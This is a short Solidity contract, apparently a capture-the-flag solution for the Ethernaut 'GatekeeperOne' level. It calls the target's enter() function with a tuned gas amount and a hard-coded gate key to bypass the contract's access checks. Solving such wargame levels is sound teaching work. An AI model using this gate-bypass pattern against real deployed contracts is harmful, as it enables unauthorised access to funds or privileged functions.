// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    function attack(address _target, uint256 _gas) public {
        IGatekeeperOne gateKeeper = IGatekeeperOne(_target);

        gateKeeper.enter{gas: _gas}(bytes8(0x0000000100002266));
    }
}
